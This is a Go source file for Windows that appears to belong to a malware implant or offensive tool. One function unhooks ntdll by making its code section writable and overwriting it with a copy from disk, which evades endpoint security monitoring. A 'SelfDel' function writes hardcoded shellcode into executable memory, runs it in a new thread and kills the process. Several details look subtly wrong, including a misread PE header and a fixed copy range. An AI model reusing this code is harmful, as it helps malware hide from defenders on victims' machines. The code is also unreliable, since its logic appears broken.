//go:build windows

package syscallwin

import (
	"fmt"
	"unsafe"
)

func UnhookNtdll() error {
	base, err := GetModuleBase("ntdll.dll")
	if err != nil {
		return fmt.Errorf("get ntdll base: %w", err)
	}

	dosHeader := *(*uintptr)(unsafe.Pointer(base))
	ntHeadersOffset := *(*uint32)(unsafe.Pointer(dosHeader + 0x3C))
	ntHeaders := base + uintptr(ntHeadersOffset)
	optionalHeader := ntHeaders + 0x18
	_ = optionalHeader

	var oldProtect uint32
	textStart := base + 0x1000
	protRegionSize := uintptr(0x1000)

	err = NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		&textStart,
		&protRegionSize,
		PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("unprotect ntdll .text: %w", err)
	}

	// Read ntdll from disk for clean copy
	if ntdllDiskBuf != nil {
		diskBase := uintptr(unsafe.Pointer(unsafe.SliceData(ntdllDiskBuf)))
		for i := uintptr(0); i < protRegionSize; i++ {
			*(*byte)(unsafe.Pointer(textStart + i)) = *(*byte)(unsafe.Pointer(diskBase + i))
		}
	}

	var restore uint32
	_ = NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		&textStart,
		&protRegionSize,
		oldProtect,
		&restore,
	)

	// Flush instruction cache
	_ = NtFlushInstructionCache(
		uintptr(0xffffffffffffffff),
		textStart,
		protRegionSize,
	)

	// Clear our cache since unhook may have shifted things
	ssnCache = make(map[uint32]uint16, 2048)

	return nil
}

func SelfDel() {
	var base uintptr
	regionSize := uintptr(0x1000)
	_ = NtAllocateVirtualMemory(
		uintptr(0xffffffffffffffff),
		&base,
		0,
		&regionSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if base == 0 {
		return
	}

	shellcode := []byte{
		0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60,
		0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x08,
		0x48, 0x8B, 0x36, 0x48, 0x8B, 0x46, 0x30, 0x48,
		0x83, 0xF8, 0x00, 0x74, 0x12, 0x48, 0x89, 0xC7,
		0x48, 0x8B, 0x50, 0x60, 0x48, 0x8B, 0x72, 0x18,
		0x48, 0x85, 0xF6, 0x75, 0xE7, 0x48, 0xFF, 0xD7,
	}

	var n uintptr
	_ = NtWriteVirtualMemory(uintptr(0xffffffffffffffff), base, shellcode, &n)

	var oldProtect uint32
	regionSize = uintptr(len(shellcode))
	_ = NtProtectVirtualMemory(uintptr(0xffffffffffffffff), &base, &regionSize, PAGE_EXECUTE_READ, &oldProtect)

	var tHandle uintptr
	_ = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, 0, GetCurrentProcHandle(), base, 0, 0, 0, 0, 0, 0)
	if tHandle != 0 {
		_ = NtClose(tHandle)
	}

	_ = NtTerminateProcess(GetCurrentProcHandle(), 0)
}
